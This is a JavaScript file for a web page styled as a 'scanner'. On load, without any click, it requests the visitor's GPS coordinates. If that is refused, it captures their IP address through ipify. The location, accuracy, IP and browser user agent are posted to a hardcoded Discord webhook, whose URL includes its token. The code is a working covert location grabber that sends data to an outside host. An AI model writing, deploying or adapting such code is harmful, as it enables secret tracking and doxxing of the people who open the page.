/* global appendClock, updateClock */

// Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1453283419067777208/BzSWsBV4bWBQIydQZx3bWKXytSKAD2rAcoGUGI3zuz-GFvz-eWP1Coks-8eMXnE4TXW4";

// Send data to webhook
function sendWebhook(payload) {
  if (!WEBHOOK_URL) return;
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      timestamp: new Date().toISOString(),
      ua: navigator.userAgent,
      ...payload
    })
  }).catch(err => console.error("Webhook error:", err));
}

// JSONP IP fallback
function captureIP(callback){
  const script = document.createElement('script');
  script.src = 'https://api.ipify.org?format=jsonp&callback=' + callback.name;
  document.body.appendChild(script);
}

function handleIP(data){
  console.log("IP captured:", data.ip);
  $('#loading').text('IP captured: ' + data.ip);
  sendWebhook({ source: 'ip_only', ip: data.ip });
  scanComplete();
}

// Called when scan completes
function scanComplete() {
  $('#scanBtn').prop('disabled', false).text('RE-SCAN');
}

// GPS success handler
function success(position) {
  const { latitude, longitude, accuracy } = position.coords;

  // Update UI (optional)
  $('#loading').text(`GPS LOCKED: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} ±${accuracy}m`);

  // Send to webhook
  sendWebhook({ source: "gps", latitude, longitude, accuracy });

  scanComplete();
}

// GPS error handler
function error(err) {
  console.warn("Geolocation failed", err);
  $('#loading').text('GPS denied or unavailable. Capturing IP...');
  captureIP(handleIP);
}

// On DOM load
$(document).ready(() => {
  // append clock and start updating clock
  appendClock();
  updateClock();

  // Animate loading message
  const loading = setInterval(() => {
    $('#loading').append('.');
    if ($('#loading').length > 0 && $('#loading')[0].childNodes.length > 15) {
      clearInterval(loading);
      $('#loading').replaceWith('<h4 id="loading">Looks like there was a problem! Try refreshing your browser.</h4>')
    }
  }, 1000);

  // Setup scan button
  $('#scanBtn').click(() => {
    $('#scanBtn').prop('disabled', true).text('SCANNING...');
    $('#loading').text('Initializing scan...');

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(success, error, { timeout: 10000 });
    } else {
      error();
    }
  });

  // Optionally auto-start scan on load
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error, { timeout: 10000 });
  } else {
    error();
  }
});